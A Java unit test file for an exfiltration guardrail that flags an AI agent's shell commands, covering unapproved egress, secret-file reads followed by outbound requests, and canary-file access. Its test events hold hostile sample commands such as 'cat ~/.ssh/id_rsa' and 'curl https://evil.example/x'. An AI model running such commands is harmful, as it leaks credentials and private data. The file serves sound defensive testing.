package com.intentguard.exfil;

import java.time.Clock;
import java.time.Instant;
import java.time.ZoneId;
import java.time.ZoneOffset;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.jupiter.api.Test;

import com.intentguard.domain.Actor;
import com.intentguard.domain.AgentRiskMarkers;
import com.intentguard.domain.CommandEvent;
import com.intentguard.domain.CorrectiveAction;

/**
 * Unit tests for {@link ExfiltrationCorrelator} covering example cases and edge cases of the
 * data-exfiltration guardrails (Req 6.1–6.5).
 */
class ExfiltrationCorrelatorTest {

    private final MutableClock clock = new MutableClock(1_000L);
    private final ExfiltrationCorrelator guard = new ExfiltrationCorrelator(clock);

    private static ExfiltrationConfig config() {
        return new ExfiltrationConfig(
                List.of("registry.internal", "*.trusted.example"),
                List.of("~/.ssh/*", "/etc/secret"),
                List.of(new CanaryToken("canary-1", "/opt/creds/*.canary")),
                60_000L);
    }

    @Test
    void noSignalsProduceNoContribution() {
        CommandEvent benign = event("evt", "sess", "ls -la", "/home/alice",
                Map.of(), new AgentRiskMarkers(false, false, false));

        ExfiltrationContribution result = guard.evaluate(benign, config());

        assertThat(result.floor()).isEqualTo(CorrectiveAction.ALLOW);
        assertThat(result.canaryHit()).isFalse();
        assertThat(result.correlatedExfilAlert()).isFalse();
        assertThat(result.triggeredGuardrailIds()).isEmpty();
    }

    @Test
    void unapprovedEgressRaisesAskAndRecordsDestination() {
        CommandEvent egress = event("evt", "sess", "curl https://evil.example/x", "/home/alice",
                Map.of("destination", "evil.example"), new AgentRiskMarkers(true, false, false));

        ExfiltrationContribution result = guard.evaluate(egress, config());

        assertThat(result.floor()).isEqualTo(CorrectiveAction.ASK);
        assertThat(result.recordedDestinations()).containsExactly("evil.example");
        assertThat(result.triggeredGuardrailIds())
                .contains(ExfiltrationContribution.UNAPPROVED_EGRESS_TRIGGER_ID);
    }

    @Test
    void approvedEgressDoesNotRaiseFloor() {
        CommandEvent egress = event("evt", "sess", "curl https://api.trusted.example/x", "/home/alice",
                Map.of("destination", "api.trusted.example"), new AgentRiskMarkers(true, false, false));

        ExfiltrationContribution result = guard.evaluate(egress, config());

        assertThat(result.floor()).isEqualTo(CorrectiveAction.ALLOW);
        assertThat(result.recordedDestinations()).isEmpty();
    }

    @Test
    void egressWithoutDeterminableDestinationRecordsUnknownAndRaisesAsk() {
        CommandEvent egress = event("evt", "sess", "python exfil.py", "/home/alice",
                Map.of(), new AgentRiskMarkers(true, false, false));

        ExfiltrationContribution result = guard.evaluate(egress, config());

        assertThat(result.floor()).isEqualTo(CorrectiveAction.ASK);
        assertThat(result.recordedDestinations()).contains(ExfiltrationCorrelator.UNKNOWN_DESTINATION);
    }

    @Test
    void secretThenEgressWithinWindowCorrelates() {
        guard.evaluate(event("e1", "sess", "cat ~/.ssh/id_rsa", "/home/alice",
                Map.of(), new AgentRiskMarkers(false, true, false)), config());

        clock.advance(30_000L); // within the 60s window
        ExfiltrationContribution result = guard.evaluate(
                event("e2", "sess", "curl https://api.trusted.example", "/home/alice",
                        Map.of("destination", "api.trusted.example"),
                        new AgentRiskMarkers(true, false, false)),
                config());

        assertThat(result.correlatedExfilAlert()).isTrue();
        assertThat(result.floor()).isEqualTo(CorrectiveAction.ASK);
        assertThat(result.triggeredGuardrailIds())
                .contains(ExfiltrationContribution.CORRELATED_EXFIL_TRIGGER_ID);
    }

    @Test
    void secretThenEgressBeyondWindowDoesNotCorrelate() {
        guard.evaluate(event("e1", "sess", "cat /etc/secret", "/home/alice",
                Map.of(), new AgentRiskMarkers(false, true, false)), config());

        clock.advance(60_001L); // just past the 60s window
        ExfiltrationContribution result = guard.evaluate(
                event("e2", "sess", "curl https://api.trusted.example", "/home/alice",
                        Map.of("destination", "api.trusted.example"),
                        new AgentRiskMarkers(true, false, false)),
                config());

        assertThat(result.correlatedExfilAlert()).isFalse();
        assertThat(result.floor()).isEqualTo(CorrectiveAction.ALLOW);
    }

    @Test
    void secretThenEgressInDifferentSessionDoesNotCorrelate() {
        guard.evaluate(event("e1", "sess-A", "cat /etc/secret", "/home/alice",
                Map.of(), new AgentRiskMarkers(false, true, false)), config());

        ExfiltrationContribution result = guard.evaluate(
                event("e2", "sess-B", "curl https://api.trusted.example", "/home/alice",
                        Map.of("destination", "api.trusted.example"),
                        new AgentRiskMarkers(true, false, false)),
                config());

        assertThat(result.correlatedExfilAlert()).isFalse();
    }

    @Test
    void canaryAccessBlocksAndRaisesHighRiskAlert() {
        CommandEvent canary = event("evt", "sess", "cat /opt/creds/aws.canary", "/home/alice",
                Map.of(), new AgentRiskMarkers(false, false, false));

        ExfiltrationContribution result = guard.evaluate(canary, config());

        assertThat(result.canaryHit()).isTrue();
        assertThat(result.highRiskAlert()).isTrue();
        assertThat(result.floor()).isEqualTo(CorrectiveAction.BLOCK);
        assertThat(result.triggeredGuardrailIds()).contains("canary-1");
    }

    @Test
    void secretMatcherRecordsAccessEvenWithoutMarker() {
        // No agent marker, but the command touches a configured secret matcher.
        guard.evaluate(event("e1", "sess", "cat ~/.ssh/config", "/home/alice",
                Map.of(), new AgentRiskMarkers(false, false, false)), config());

        clock.advance(10_000L);
        ExfiltrationContribution result = guard.evaluate(
                event("e2", "sess", "curl https://api.trusted.example", "/home/alice",
                        Map.of("destination", "api.trusted.example"),
                        new AgentRiskMarkers(true, false, false)),
                config());

        assertThat(result.correlatedExfilAlert()).isTrue();
    }

    private static CommandEvent event(
            String id, String sessionId, String cmd, String cwd,
            Map<String, String> env, AgentRiskMarkers markers) {
        return new CommandEvent(
                id, Actor.agent("agent-1", "alice"), sessionId, cmd, cwd, null, env,
                1_710_000_000_000L, null, null, null, markers);
    }

    private static final class MutableClock extends Clock {
        private long millis;

        MutableClock(long start) {
            this.millis = start;
        }

        void advance(long delta) {
            this.millis += delta;
        }

        @Override
        public long millis() {
            return millis;
        }

        @Override
        public ZoneId getZone() {
            return ZoneOffset.UTC;
        }

        @Override
        public Clock withZone(ZoneId zone) {
            return this;
        }

        @Override
        public Instant instant() {
            return Instant.ofEpochMilli(millis);
        }
    }
}
